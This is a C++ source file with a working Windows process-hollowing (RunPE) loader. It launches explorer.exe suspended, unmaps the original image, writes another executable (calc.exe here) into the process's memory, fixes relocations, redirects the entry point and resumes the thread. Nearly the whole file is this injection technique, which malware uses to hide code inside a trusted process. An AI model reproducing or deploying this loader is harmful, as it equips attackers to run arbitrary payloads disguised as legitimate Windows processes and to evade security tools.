#include <iostream>
#include <windows.h>
#include "ntapi.h"
#include "main.h"

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int RunPE32(LPVOID lpBuffer)
{
	// create destination process and suspend primary thread
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(NULL, (LPSTR)"\"c:\\windows\\syswow64\\explorer.exe\"", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) { 
		printf("[-] Failed to create process: %i\n", GetLastError());
		return -1;
	};
	HANDLE destProcess = pi.hProcess;
	NtSuspendProcess(destProcess);

	// get context of the dest process thread
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext_(pi.hThread, context);

	// get destination imageBase offset address from the PEB
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLength = 0;
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;

	// get destination imageBaseAddress
	LPVOID destImageBase = 0;
	NtReadVirtualMemory(destProcess, (PVOID)(context->Ebx + 8), &destImageBase, sizeof(PVOID), NULL);

	// carve out the destination image
	NtUnmapViewOfSection(destProcess, destImageBase);

	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)lpBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)lpBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	// allocate new memory in destination image for the source image
	LPVOID newDestImageBase = VirtualAllocEx_(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;

	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
	NtWriteVirtualMemory(destProcess, newDestImageBase, lpBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// get pointer to first source image section
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((UINT_PTR)lpBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;

	// copy source image sections to destination
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((UINT_PTR)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((UINT_PTR)lpBuffer + sourceImageSection->PointerToRawData);
		NtWriteVirtualMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (memcmp(sourceImageSection->Name, ".reloc", 7) != 0)
		{
			sourceImageSection++;
			continue;
		}
		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((UINT_PTR)lpBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((UINT_PTR)lpBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				NtReadVirtualMemory(destProcess, (PVOID)((UINT_PTR)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), NULL);
				patchedBuffer += deltaImageBase;

				NtWriteVirtualMemory(destProcess, (PVOID)((UINT_PTR)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), NULL);
			}
		}
	}

	// update destination image entry point to the new entry point of the source image and resume destination image thread
	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Eax = patchedEntryPoint;
	SetThreadContext_(pi.hThread, context);
	ResumeThread_(pi.hThread);

	return 0;
}

int main(void) {
	printf("%s %s\n", __DATE__, __TIME__);
	HANDLE hFile = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwFileSize = 0;
	DWORD dwBytesRead = 0;
	
	// Open file for injecting 
	hFile = CreateFile(L"C:\\windows\\syswow64\\calc.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != NULL) {
		dwFileSize = GetFileSize(hFile, NULL);
		lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
		if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL)) {
			UINT_PTR uiBaseAddress = (UINT_PTR)lpBuffer;

			// get the File Offset of the modules NT Header
			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

			// currenlty we can only process a PE file which is the same type as the one this fuction has  
			// been compiled as
			if (pNtHeaders->OptionalHeader.Magic == 0x010B) // PE32
			{
				printf("[+] x86 PE Found\n");
				RunPE32(lpBuffer);
			}
			else if (pNtHeaders->OptionalHeader.Magic == 0x020B) // PE64
			{
				printf("[+] x64 PE Found\n");
				printf("[-] Can't process x64 PEs yet (Trust me, I tried :/)");
				return 0;
			}
			else
			{
				printf("[-] ERROR: Could not read magic\n");
				return 0;
			}
			
		}
		else {
			printf("[-] ReadFile error: %i\n", GetLastError());
		};
	}
	else {
		printf("[-] CreateFile error: %i\n", GetLastError());
	}

}